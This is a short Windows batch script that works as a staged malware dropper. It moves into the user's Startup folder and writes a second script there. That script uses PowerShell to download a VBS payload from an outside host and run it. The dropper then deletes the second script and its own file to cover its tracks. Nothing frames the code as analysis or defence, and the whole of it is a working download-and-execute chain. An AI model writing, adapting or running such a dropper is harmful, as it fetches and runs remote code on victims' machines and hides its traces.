@echo off

SET currentDirectory=%cd%

SET STARTUPPATH="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
cd %STARTUPPATH%


@REM Wirtes the powershell script to download and run the payloads to a .cmd file called "stage2.cmd"
(
    @REM download the payload
    echo powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/Basic_typr.vbs' -OutFile payload.vbs"
    echo powershell Start-Sleep -Seconds 1
    echo powershell ./payload.vbs
    @REM run stage2
    @REM powershell -ExecutionPolicy Bypass -Command "& 'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\popup.cmd'"
) > stage2.cmd

powershell ./stage2.cmd
del stage2.cmd

@rem uncomment to make the script delete itself
cd %currentDirectory%
del initial.cmd

